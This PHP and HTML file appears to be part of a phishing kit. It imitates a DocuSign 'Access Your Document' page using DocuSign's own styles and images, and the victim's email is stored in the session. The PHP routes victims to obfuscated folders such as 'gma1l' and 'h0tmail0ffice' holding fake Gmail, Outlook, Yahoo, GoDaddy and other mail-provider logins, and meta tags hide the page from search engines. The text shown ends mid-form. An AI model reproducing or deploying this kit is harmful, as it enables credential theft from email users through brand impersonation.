<?php
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}

$onclick = "docon.php";
$uricomp = "AuthState=_8b84cec567b1f281e967942a311e80e59edb25def1";
$sessvar = "567b1f28180e59ede967942a311eb25def1_8b84cec";
$randedlast = "567b1f28180e59ede967942a311eb25def1_8b84cec_8b84c";




$email = $_SESSION['email'];
$dom = $_GET['provider'];
if ($dom == "msn") {
    $folder = "h0tmail0ffice/";
    $loader = "img/offc.png";
} elseif ($dom == "yahoo") {
    $folder = "yah00/";
    $loader = "img/yhoo_1.png";
} elseif ($dom == "aol") {
    $folder = "a0l/";
    $loader = "img/aol_1.png";
} elseif ($dom == "google") {
    $folder = "gma1l/";
    $loader = "img/gml_1.png";
} elseif ($dom == "office") {
    $folder = "h0tmail0ffice/";
    $loader = "img/out.png";
} elseif ($dom == "rackspace") {
    $folder = "rackspac3/";
    $loader = "img/webm.png";
} elseif ($dom == "godaddy") {
    $folder = "g0daddy/";
    $loader = "img/webm.png";
} elseif ($dom == "earthlink") {
    $folder = "earthl1nk/";
    $loader = "img/webm.png";
} elseif ($dom == "centurylink") {
    $folder = "centuryl1nk/";
    $loader = "img/webm.png";
} elseif ($dom == "comcast") {
    $folder = "c0mcast/";
    $loader = "img/webm.png";
} elseif ($dom == "rr") {
    $folder = "rrc0m/";
    $loader = "img/webm.png";
} elseif ($dom == "optonline") {
    $folder = "opt0nline/";
    $loader = "img/webm.png";
} else {
    $folder = "webhook/";
    $loader = "img/webm.png";
}

?>

<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet">
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex">
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir">
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet">
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet">
    <title>
    DocuSign
</title><link rel="icon" type="image/x-icon" href="https://docucdn-a.akamaihd.net/olive/latest/img/new_favicon.png"><meta content="JavaScript" name="vs_defaultClientScript"><meta content="C#" name="CODE_LANGUAGE"><meta name="viewport" content="initial-scale=1.0"><link id="ds_dsCss_styMartiniFonts" rel="stylesheet" href="https://docucdn-a.akamaihd.net/signing/1.9.0/css/font-faces.css" type="text/css">

<style id="ds_dsCss_styHolder" type="text/css">
 
body  { margin:0px; font-family: Helvetica, Arial, sans-serif !important; font-size:12px; color:#333333; background-color:none;background-image:url(https://www.docusign.net/Member/Images/backgrounds/body_background.png);background-repeat:repeat;}
input{font-family: Helvetica, Arial, sans-serif !important;font-size:12px;}select{font-family: Helvetica, Arial, sans-serif !important;font-size:12px;}textarea{font-family: Helvetica, Arial, sans-serif !important;font-size:13px;}button{font-family: Helvetica, Arial, sans-serif !important;font-size:13px;}a{ font-family: Helvetica, Arial, sans-serif !important; color:#0D61AF;  cursor:pointer;  text-decoration:none; font-size:13px;}a:hover {text-decoration:underline; }a.smaller { font-size: 11px; }.SubjectHeaderTxt {color: #999;}.BtnHighlight { width: 1px;  position: absolute;  background-color: #fff;  top: 0px; height:32px;}.Btnyellow_new{position: relative;cursor: pointer;text-decoration: none;white-space: nowrap;background-repeat: repeat-x;padding: 1px 15px;font-family: Helvetica, Arial, sans-serif !important;text-shadow: 0px 1px 1px rgba(255,255,255,0.5);background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient.png);-moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #e7b236;;font-size:12px;font-weight:bold;min-height:34px;background-color: #ffcc4a;color: #333333 !important;}.Btngray_reskin {border:solid 1px #cccccc;border-radius:2px;-webkit-border-radius:2px;-moz-border-radius:2px;box-shadow:0px 1px 3px 0px rgba(0,0,0,.15), inset 1px 1px 1px 1px rgba(255,255,255,0.5);-webkit-box-shadow:0px 1px 3px 0px rgba(0,0,0,.15), inset 1px 1px 1px 1px rgba(255,255,255,0.5);-moz-box-shadow:0px 1px 3px 0px rgba(0,0,0,.15), inset 1px 1px 1px 1px rgba(255,255,255,0.5);background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient.png);background-repeat: repeat-x;font-size:13px; margin: 2px;text-shadow: 0px 1px 1px rgba(255,255,255,0.5);border: solid 1px #C6C6C6;background-color: #e2e2e2;color: #666666;}.Btngray_reskin:hover, .SigningHeaderButton:hover{background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_34_hover.png);}.Btngray_reskin:active, .HeaderBtnyellow_new:active, .SigningHeaderButton:active{background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_34_press.png);}.SigningHeaderButton{text-shadow: 0px 1px 1px rgba(255,255,255,0.5);border: solid 1px #C6C6C6;background-color: #e2e2e2;color: #666666;}.Btngray_home {border:solid 1px #cccccc;border-radius:2px;-webkit-border-radius:2px;-moz-border-radius:2px;box-shadow:0px 1px 3px 0px rgba(0,0,0,.15);-webkit-box-shadow:0px 1px 3px 0px rgba(0,0,0,.15);-moz-box-shadow:0px 1px 3px 0px rgba(0,0,0,.15);background-color:#DCDCDC;background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_40.png);background-repeat: repeat-x;font-size:16px; color:#333333;position: relative;height: 40px;cursor: pointer;}.Btngray_home:hover{background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_40_hover.png);}.Btngray_home:active{background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_40_press.png);}.Btnyellow_reskin{  background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_autonav_gradient_40.png);  background-color: #FFCC4A;  background-repeat: repeat-x;  border: 1px solid #e7b236;  border-radius: 2px;  -webkit-border-radius: 2px;  -moz-border-radius: 2px;  cursor: pointer;  position: relative;  text-decoration: none;  font-weight:bold;  width: 101px !important;  height: 42px !important;   text-shadow: 0px 1px 1px rgba(255,255,255,0.5);  color: #333333;}.Btnyellow_reskin_hover {background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_autonav_gradient_40_on.png); }.Btnyellow_login{  font-family: 'Maven Pro', Arial, sans-serif !important;  font-weight: bold;  font-size: 13px;  letter-spacing: .6px;  background-color: #ffc820;  background-repeat: repeat-x;  border: 1px solid transparent;  border-radius: 2px;  -webkit-border-radius: 2px;  -moz-border-radius: 2px;  cursor: pointer;  position: relative;  white-space:nowrap;  text-decoration: none;  margin: 0 !important;  height: 34px !important;  text-transform: uppercase;  color: #333;  padding: 0 18px;  line-height: 30px;  min-width: 0 !important;}.Btnyellow_login .BtnHighlight {display:none;}.Btnyellow_login_hover, .Btnyellow_login:hover {background-color: #f7ba00;}.Btnyellow_login:active {background-color: #eaa602;}.Btngray_login{  font-family: 'Maven Pro', Arial, sans-serif !important;  font-weight: bold;  font-size: 13px;  letter-spacing: .6px;  background-color: #e9e9e9;  background-repeat: repeat-x;  border: 1px solid transparent;  border-radius: 2px;  -webkit-border-radius: 2px;  -moz-border-radius: 2px;  cursor: pointer;  position: relative;  white-space:nowrap;  text-decoration: none;  margin: 0 !important;  height: 34px !important;  text-transform: uppercase;  color: #333;  padding: 0 18px;  line-height: 30px;  min-width: 0 !important;}.Btngray_login .BtnHighlight {display:none;}.Btngray_login_hover, .Btngray_login:hover {background-color: #dcdcdc;}.Btngray_login:active {background-color: #dcdcdc;}.Btnyellow_home{  background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_autonav_gradient_40.png);  background-repeat: repeat-x;  border: 1px solid #e7b236;  border-radius: 2px;  box-shadow:0px 1px 3px 0px rgba(0,0,0,.15);  -webkit-box-shadow:0px 1px 3px 0px rgba(0,0,0,.15);  -moz-box-shadow:0px 1px 3px 0px rgba(0,0,0,.15);  -webkit-border-radius: 2px;  -moz-border-radius: 2px;  cursor: pointer;  position: relative;  font-size:16px;  text-decoration: none;  width: 91px !important;  height: 40px !important;  text-shadow: 0px 1px 1px rgba(255,255,255,0.5);  color: #333333;  cursor: pointer;}.Btnyellow_home:active {background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_autonav_gradient_40_on.png);}.BtnHighlight40{height: 40px !important;opacity: 0.2;}.Btnprimary {position: relative;cursor: pointer;text-decoration: none;white-space: nowrap;background-repeat: repeat-x;padding: 1px 15px;font-family: Helvetica, Arial, sans-serif !important;text-shadow: 0px 1px 1px rgba(255,255,255,0.5);background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient.png);-moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #C6C6C6;font-size:12px;font-weight:bold;min-height:34px;background-color: #e2e2e2;color: #0D61AF;}.Btnprimary:hover{background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_hover.png);}.Btnprimary:disabled { color: #bbbbbb;}.Btnsecondary {position: relative;cursor: pointer;text-decoration: none;white-space: nowrap;background-repeat: repeat-x;padding: 1px 15px;font-family: Helvetica, Arial, sans-serif !important;text-shadow: 0px 1px 1px rgba(255,255,255,0.5); background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient.png);-moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #C6C6C6;font-size:12px;font-weight:bold;min-height:34px;background-color: #e2e2e2;color: #666666;}.Btnsecondary:hover{background-image: url(https://www.docusign.net/Member/Images/backgrounds/button_gradient_hover.png);}.Btnsecondary:disabled { color: #bbbbbb;}.Btntransparent {background-color: transparent;border:solid 1px transparent;cursor: pointer;font-weight: normal;position: relative;text-decoration: none;padding:1px;margin:0px 10px;font-size:12px;min-height:36px;border:solid 0px transparent;color: #0D61AF;}.DiaHCSignDialog, .DiaHCSignDialogSmall {position: absolute;top: 20px;right: 16px;padding: 5px 5px 0px 0px;}.Btntransparent:hover{ text-decoration:underline;}.Btntransparent:disabled{ color:#A0A0A0;}.Modal { position:absolute;z-index:12;top:0px;height:500px;-ms-filter:'progid:DXImageTransform.Microsoft.Alpha(Opacity=60)';filter:Alpha(opacity=60);opacity:.6;background-color:transparent !important;background-color:#FFFFFF;background-image:url(https://www.docusign.net/Member/Images/backgrounds/masknew.png) !important;background-image:none;background-repeat:repeat;left:0px;width:100%;}.DiaHTSignDialog {padding: 30px 35px 4px;}.DashboardArea{    background: #fff;border: solid 1px #ccc;padding:10px;clear : both;margin-top : 20px;}.DashboardLinkBoldText{ font-weight: bold; font-size: 12px ; color: #069; cursor: pointer;}.DashboardDisabledText{ font-weight: bold;color: #9A9A9A;}.DashboardLinkBoldText:hover{ text-decoration:underline;}.DashboardLinkText{ font-weight: normal; font-size: 12px ; color: #069; cursor: pointer;}.DashboardLinkText:hover{ text-decoration:underline;}.DashboardLink11BoldText{ font-weight: bold; font-size: 11px ; color: #069; cursor: pointer;}.DashboardLink11BoldText:hover{ text-decoration:underline;}.DashboardIdName{   font-weight: normal;font-size: 18px ;color: #000000;font-family: Helvetica, Arial, sans-serif !important;}.FieldLbl { padding:2px 5px 0px 13px !important; }.Field  { color:#333333; margin:5px;  padding:2px 9px; resize:none; background-color: #FAFAFA;  -moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #CCC;}.Field:focus { outline:none; border:solid 1px #333333;}.Field:disabled{ color:#bbbbbb; background-color:#efefef; border:solid 1px #cccccc;}select.Field { padding:1px 2px 1px 2px !important; -moz-border-radius:3px !important; -webkit-border-radius:3px !important;  border-radius:3px !important;}.FieldMissing { color:#999999; }.FieldNotMissing { color:#333333; }.FieldRequired  {color:#333333; margin:5px;  padding:2px 9px; resize:none; background-color: #FAFAFA;  -moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #CCC;}.FieldNoEdit{ margin:5px;  padding:2px 9px;resize:none;-moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #CCC;border:solid 1px #CCC;background-color:#ffffff;}.FieldNoEdit:disabled{ color:#bbbbbb; background-color:#efefef; border:solid 1px #cccccc;}.FieldNoEdit:hover{ color:#333333; margin:5px;  padding:2px 9px; resize:none; background-color: #FAFAFA;  -moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;border:solid 1px #CCC; }.SigningGroupEmailDisabled:hover{background-color: #efefef;} .LogoutLinks  {  position: absolute;   top:0px;right:25px;  z-index: 1000;  }.TabsHolder  { position: relative;  z-index: 100; min-height:51px;background-color: #1E4CA1;background-image:url(https://www.docusign.net/Member/Images/backgrounds/header_noisegradient.png);background-repeat:repeat-x;} .TabsPointer {position:absolute;z-index:101;top:42px;}.Border{position: relative;min-width: 1024px;border-bottom: solid 1px #cccccc;}.Header{position: relative;background-color: transparent;background-image:url(https://www.docusign.net/Member/Images/backgrounds/subheader_background.png);background-repeat:repeat-x;background-position:bottom;min-height: 69px;}.HeaderContent{position: relative;margin: 0px 10px 0px 10px;float: left;}.HeaderLink { color: #0D61AF; font-size:12px; }.Logo {position: relative;float:left;vertical-align:middle;}.LogoFrameL{margin: 0px 0px 0px 40px;}.LogoFrameR{margin: 0px 40px 0px 0px;}.LogoLeft{ margin: 0px;cursor: pointer;background-color:#ffffff;background-image:url(https://www.docusign.net/Member/Images/backgrounds/header_logo_gradient.png);background-repeat:repeat-x;padding:5px 0px;height:37px;}.LogoRight{position: relative;margin: 5px 10px 2px 10px;float: right;}.FormBody{min-height: 300px;position: relative;margin: 0px;clear: both;}.Footer{min-width: 944px;text-align: right;padding: 0 40px;}.FooterLogin{position: absolute;padding: 0px;display: block;}.FooterImage{position: relative;float: left;margin-right: 20px;}.DiaHSignDialogSmall {overflow: visible;}#divLanguageSelected {*display:inline;}.FooterLinks{ color:#999;display: inline-block;*display: inline;overflow: visible;position: relative;}.FooterLink {padding-top: 4px;display: inline-block; color:#999; font-size:12px; cursor:pointer;}.FooterLink:hover{ text-decoration:underline;}.FooterLink.set-mobile {padding-right: 15px;}.FooterMenuClosed{color: #999;display: none;z-index: 1000;cursor: pointer;min-width: 100px;}.FooterMenuClosed:hover{display: block;left: 0px;top: 0px;z-index: 1000;cursor: pointer;min-width: 100px; border:solid 1px #DEDEDE;   -moz-border-radius:10px; -webkit-border-radius:10px;  border-radius:10px;}.SctClr { position:relative; clear:both; height:1px; font-size:1px;}.DefaultLinkBlue { color: #0D61AF; }.DefaultLinkDark { color: #000000; }.DefaultLinkLight { color: #FFFFFF; }.DefaultLink12 { font-size: 12px; }.DefaultLink, .DefaultLink:visited{text-decoration: none;cursor: pointer;}.DefaultLink:hover{text-decoration: underline;cursor: pointer;}.ToolSp{ position:relative; height:2px; font-size:2px; background-image:url(https://www.docusign.net/Member/Images/backgrounds/options_spacer.png); background-repeat:repeat-x; margin-top:3px; margin-bottom:3px;}.ToolSpSmall{ position:relative; height:2px; font-size:2px; background-image:url(https://www.docusign.net/Member/Images/backgrounds/options_spacer.png); background-repeat:repeat-x; margin-top:1px;}.SearchTxtImg{ position:absolute; right:0px;  cursor: pointer;  vertical-align: middle;background-repeat:no-repeat;top:0px;height:32px;width:32px; background-color:#e2e2e2;background-image: url(https://www.docusign.net/Member/Images/controls/search_new_dark.png);-moz-border-radius:0px 2px 2px 0px;-webkit-border-radius:0px 2px 2px 0px;border-radius:0px 2px 2px 0px;border:solid 1px #C6C6C6;}.SearchTxtImg:hover{ background-image: url(https://www.docusign.net/Member/Images/controls/search_new_dark_hover.png);}.SearchField { padding: 2px 30px 2px 7px !important;height:28px;width:200px;margin-top:0px;border:solid 1px #C6C6C6 !important;}.DIA  { position:absolute; z-index:500; min-width: 385px;}.DIASCREEN { position:fixed !important;   z-index:500; }.DIAFLOW  { position:relative; margin:0px 10px; width:1015px; }.DIAFLOWLEFTONLY{ position:relative; margin:0px 10px; width:242px;}.Correcting{ position:relative; margin:0px 10px; width:1015px; font-size: 20px;padding: 6px;}.ErrorMessageText{ font-weight: bold; font-size: 11px; color: #DC143C;}.ContentTextBoldBlue{ font-weight: bold; font-size: 12px; color: #0073cf;}.ContentTextBlue{ font-weight: normal; font-size: 12px; color: #0073cf;}.Page{  margin:30px 0px 0px 55px;    position:relative;background-color:#646464;clear:both;border:solid 1px #c4c4c4;;-moz-box-shadow: 2px 2px 8px #646464;-webkit-box-shadow: 2px 2px 8px #646464;box-shadow: 2px 2px 8px #646464;}.PageIdentifier  {  margin:0px 0px 0px 55px;position:relative;background-color:transparent;padding-top:6px;     }.CurrentFilter{font-size: 12px;}.BorderRoundGray { padding: 5px;-moz-border-radius:5px;-webkit-border-radius:5px; border-radius:5px;border:solid 1px #CFCFCF;}.histEntityTitle {color: #999999;font-size: 14px;}.histEntityContent {  color: #333333;font-size: 14px;}.historyDataRow {margin-bottom: 4px;font-size: 14px;color: #333333;border-bottom: solid 1px #e8e8e8;float:left;width:100%;}.timeColumn {display: inline-block;vertical-align: top;width: 14%;margin-right:10px;float:left;}.userColumn {display: inline-block;vertical-align: top;width: 20%;margin-right:10px;float:left;}.actionColumn {display: inline-block;vertical-align: top;width: 12%;margin-right:10px;float:left;}.activityColumn {display: inline-block;vertical-align: top;width: 37%;margin-right:10px;float:left;}.statusColumn {display: inline-block;vertical-align: top;width: 8%;}
.TabCommon{cursor:pointer;float:left;position:relative;font-size:14px;text-align:center;margin-left:0px;padding-left:5px;padding-right:5px;border-left:solid 1px #143169;border-right:1px solid transparent;bottom:0px;color:#FFFFFF;}.TabSmall{ font-weight:bold;border:1px solid #C6C6C6 !important;font-size:12px;min-width:70px !important;min-height:24px !important;padding-top:9px;background-image:url(Images/backgrounds/button_gradient.png);background-repeat:repeat-x;background-color: #e2e2e2;color:#666666;}.TabSelSmall{ font-weight:bold;border:none !important;font-size:12px;min-width:72px !important;min-height:25px !important;padding-top:10px;background-color: #1E4CA1;color:#FFFFFF;}.TabBig{ font-size:13px;font-weight:bold;height:29px !important;min-width:100px !important;padding-top:16px;}.TabSelBig{ font-size:13px;font-weight:bold;border-right:1px solid transparent;border-bottom:solid 1px #143169;background-color: #143169;height:29px !important;min-width:100px !important;padding-top:16px;}.TabOuter{ border-right:solid 1px #143169;float:left;position:relative;}.TabOuterSmall{float:left;position:relative;-moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;}.TabSpace { float: left;height: 10px;position: relative;width: 280px;}.HeaderTextStyle{ font-size:13px;font-weight:bold; font-size:13px;font-weight:bold;color:#FFFFFF;}.HeaderBackground{ background-color: #1E4CA1;}
.ActionsMenu{display: block;z-index: 1000;cursor: pointer;min-width: 100px; background-color: #FAFAFA; border:solid 1px #A4A4A4;  -moz-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -webkit-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px; color:#333333;}.ActionsMenuManage{display: block;z-index: 1000;cursor: pointer; position: absolute;  min-width: 150px; -moz-border-radius:0px 0px 2px 2px;-webkit-border-radius:0px 0px 2px 2px;border-radius:0px 0px 2px 2px; -moz-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -webkit-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); background-color: #fff;border:solid 1px #ccc;-moz-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -webkit-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3);}.ActionsMenuClosed{display: block;left: 0px;top: 0px;z-index: 1000;cursor: pointer;min-width: 100px;border: solid 1px transparent;}.ActionsMenuClosedNoHover{display: block;left: 0px;top: 0px;z-index: 1000;cursor: default;min-width: 100px;border: solid 1px transparent;}.ActionsMenuDisabled{color:#bbbbbb;}.ActionsMenuClosed:hover{display: block;left: 0px;top: 0px;z-index: 1000;cursor: pointer;min-width: 100px; background-color: #FAFAFA; border:solid 1px #A4A4A4;  -moz-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -webkit-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -moz-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;}.ActionMenuShowDown{left: 0px;top: 0px;}.ActionMenuShowDownNew {left: 0px;top: 0px;float:right; border: solid 1px transparent; background-color: #143169;}.ActionMenuShowUp{left: 0;bottom: 20px;position: absolute;}.ActionMenuItemTop{display: block;clear: both;padding-top: 5px;padding-left: 10px;white-space: nowrap;height: 24px;-moz-border-radius:2px 2px 0px 0px;-webkit-border-radius:2px 2px 0px 0px;border-radius:2px 2px 0px 0px;}.ActionMenuItemTopSmall{display: block;clear: both;white-space: nowrap;height: 5px;-moz-border-radius:2px 2px 0px 0px;-webkit-border-radius:2px 2px 0px 0px;border-radius:2px 2px 0px 0px;}.ActionMenuItemBottom{display: block;clear: both;border-top: solid 0px #999999;padding-top: 0px;padding-right: 0px;padding-left: 0px;white-space: nowrap;height: 5px;-moz-border-radius:0px 0px 2px 2px;-webkit-border-radius:0px 0px 2px 2px;border-radius:0px 0px 2px 2px;}.ActionMenuItem{display: block;clear: both;padding-top: 6px;padding-bottom: 6px;padding-right: 10px;padding-left: 10px;white-space: nowrap;}.ActionMenuItemHover, .ActionMenuItem:hover{display: block;clear: both;padding-top: 6px;padding-bottom: 6px;padding-right: 10px;padding-left: 10px;white-space: nowrap;background-color: #e4e4e4;}.ActionMenuFltLeft{position: relative;float: left;margin: 5px 0px 5px 0px;vertical-align: top;}.ActionMenuFltLeftSpace{height: 1px;font-size: 1px;z-index: 19;}.ActionMenuItemFltTop{position: relative;padding: 2px;padding-left: 5px;white-space: nowrap;-webkit-border-radius: 5px 5px 0px 0px;-moz-border-radius: 5px 5px 0px 0px;border-radius: 5px 5px 0px 0px;}.ActionMenuItemImg{position: relative;vertical-align: middle;margin: 0px 5px 0px 5px;border: none;}.TightMenuItem{display: block;clear: both;padding: 0px 0px 0px 0px;white-space: nowrap;height: 24px;}.AccountMenuNew { background-color:#fff; border:solid 1px #ccc; background-color: #FFFFFF;position: absolute;right: 10px;top: 50px; -moz-border-radius:2px;  -webkit-border-radius:2px;  border-radius:2px; -moz-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); -webkit-box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3); box-shadow:0px 0px 6px 0px rgba(0, 0, 0, 0.3);}#ds_divUserAccountsMenuNew:hover { border: solid 1px transparent; background-color: #143169;}.AccountOpenMenuNew { padding-left: 10px;  padding-right: 10px;  white-space: nowrap; width:80px; min-width:80px; height:40px; padding-top:5px; border-left:solid 1px #143169;border-right:solid 1px #143169;}.AccountSelected {height: 29px; text-align: right; padding-top: 9px; margin-right: 20px; float: left; font-size: 11px;color:#FFFFFF;}.UpdateAccount { float: left;  margin-right:10px; padding-top:9px; font-size:11px; color:#FFFFFF;}


    .RowHeaderCell{border-right: solid 1px transparent;border-left: solid 1px transparent;border-bottom: solid 1px #ccc;background-color:#fff;height: 23px;vertical-align: middle;border-top: none;white-space: nowrap;padding-left: 4px;padding-right: 4px;cursor:pointer;}.RowHeaderCell:hover{ text-decoration:underline;}.RowHeaderCellNoClick{border-right: solid 1px transparent;border-left: solid 1px transparent;border-bottom: solid 1px #ccc;background-color:#fff;height: 23px;vertical-align: middle;border-top: none;white-space: nowrap;padding-left: 4px;padding-right: 4px;}.RowHeaderSectionBorder{border-right: solid 1px #FFFFFF;border-left: solid 1px #FFFFFF;border-top: solid 1px #DFDFDF;border-bottom: solid 1px #DFDFDF;}.RowHeaderSorted {background-image: url(https://www.docusign.net/Member/images/backgrounds/row_col_sorted.png) !important;background-position: bottom !important;}.RowHeaderCellAlignCenter{text-align: center;}.RowHeaderCellLeft{border-left: solid 0px #CCCCCC;}.RowHeaderCellRight{border-right: solid 0px #CCCCCC;}.RowHeaderLink, .RowHeaderLink:hover, .RowHeaderLink:visited{color: #0073cf;text-decoration: none;cursor: pointer;}.RowHeaderLinkDisabled{color: #dedede;text-decoration: none;cursor: default;}.RowNoHover{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;background-color: #ffffff;height: 25px;cursor: default;}.RowAltNoHover{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;background-color: #ffffff;height: 25px;cursor: default;}.RowCellSubHead{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 2px #cccccc;border-bottom: solid 1px #cccccc;padding: 3px 4px;}.Row{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;cursor: pointer;}.RowAlt{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;cursor: pointer;}.Row:hover, .RowAlt:hover{background-color: #f4f4f4;}.RowSel, .RowAltSel{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc; background-color: #e4e4e4;cursor: pointer;}.RowCell{border-left: none;border-right: solid 1px transparent;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;padding: 3px 0px 3px 4px;}.RowBulkCell{border-left: none;border-right: none;border-bottom: solid 1px #cccccc;vertical-align: top;padding: 3px 0px 3px 2px;}.RowCellRight{border-left: none;border-right: solid 0px transparent;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;padding: 3px 0px 3px 4px;}.RowNoHeight{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;background-color: #ffffff;cursor: pointer;}.RowAltNoHeight{border-left: solid 0px #cccccc;border-right: solid 0px #cccccc;border-top: solid 1px #cccccc;border-bottom: solid 1px #cccccc;background-color: #ffffff;cursor: pointer;}.RowNoHeight:hover, .RowAltNoHeight:hover{background-color: #f4f4f4;}.ColSorted{background-image: url(https://www.docusign.net/Member/images/backgrounds/row_col_sorted.png) !important;} 
.TreeHeader{position: relative;white-space: nowrap;height: 25px;font-weight: normal;padding-left: 4px;padding-top: 0px;margin-bottom: 0px;border-top: solid 1px transparent;}.TreeHeaderText{position: absolute;top: 4px;left: 20px;}.TreeHeaderTextNotTop{position: absolute;top: 13px;left: 20px;}.TreeHeaderActive{height: 25px;background-image: none;font-weight: bold;border: solid 1px transparent;}.TreeHeaderActiveNotTop{margin-top: 10px;padding-top: 10px;border-top: solid 1px transparent;}.TreeHeaderSel{font-weight: bold; background-image: url(https://www.docusign.net/Member/Images/backgrounds/dialog_green_h_rotated.png);}.TreeNewItem{ font-size:11px;position: absolute;top: 4px;right: 10px;font-weight: normal;}.TreeNewItemNotTop{ font-size:11px;position: absolute;top: 13px;right: 10px;font-weight: normal;}.TreeNodeSel{-webkit-user-select: none; -khtml-user-select: none;-moz-user-select: none;-o-user-select: none;user-select: none;padding-top: 2px;padding-bottom: 2px;background-image:url(https://www.docusign.net/Member/Images/backgrounds/manage_selector.png);background-repeat:repeat-x;}.TreeNode{-webkit-user-select: none; -khtml-user-select: none;-moz-user-select: none;-o-user-select: none;user-select: none;padding-top: 2px;padding-bottom: 2px;}.TreeNode:Hover{-webkit-user-select: none; -khtml-user-select: none;-moz-user-select: none;-o-user-select: none;user-select: none;padding-top: 2px;padding-bottom: 2px;background-color: #f4f4f4;}.TreeNodeNoH {-webkit-user-select: none; -khtml-user-select: none;-moz-user-select: none;-o-user-select: none;user-select: none;padding-top: 2px;padding-bottom: 2px;}



















</style>
<style id="ds_litStyle" type="text/css"></style>
    <link type="text/css" rel="stylesheet" href="https://www.docusign.net/Member/StyleSheets/activate.css">
    <link type="text/css" rel="stylesheet" href="https://www.docusign.net/Member/StyleSheets/Framework.css">
    <style>
        .security-code {
            font-size: 14px;
        }
        .sign-up {
            float: right;
            text-align:right;
            font-weight: bold;
            color: #333;
            display: table;
            max-width: 75%;
            min-height: 30px;
        }
        .sign-up span {
            display: table-cell;
            vertical-align: middle;
            white-space: nowrap;
            padding-right: 10px;
            font-size: 13px;
        }
        .sign-up a {
            display: table-cell;
            vertical-align: middle;
            font-family: 'Maven Pro', Arial, sans-serif !important;
            font-weight: bold;
            text-transform: uppercase;
            color: #357EEB;
        }
        .sign-up a:active {
            color: #1B49A0;
        }
        .sign-up a:visited {
            color: #1b49a0;
        }
        .sign-up a:hover {
            text-decoration: none;
            color: #2359B7;
        }
    </style>



  
</head><script type="text/javascript" id="webrtc-control"></script>



<body id="ds_docubody" style="">


<div id="ds_divInstance" style="display: none;">
322
</div>
       
        <div id="ds_Border" class="Border scroll-container">
<div id="ds_FormBody" class="FormBody scroll-area">
        
                
    <div class="top-area" id="newHeader">
        <div class="logo-wrapper"><a href="http://www.docusign.com/" class="logo-link"><img src="https://www.docusign.net/Member/Images/docusign.png" class="logo" alt="Docusign"></a></div>
        <div class="help-wrapper"><a href="http://www.docusign.com/support" class="help-link" target="_new">Help</a></div>
    </div>

    <div class="form-area">

        <h1><span id="ds_hldrBdy_lblPageTitle">Access Your Document</span></h1>

        <h3><span id="ds_hldrBdy_lblInstructions">Confirm the below email address is correct and proceed to Authentication, you may use your browser's back button to make necessary changes.</span></h3>

        <hr>

        <div><span id="ds_hldrBdy_lblSecurityCode" class="security-code">Email Address</span></div>

        <div><input name="ds$hldrBdy$txtAuthCode" type="text" id="ds_hldrBdy_txtAuthCode" value="<?php echo "$email"; ?>" tabindex="1" class="Field" data-qa="email-access-code-text" readonly></div>
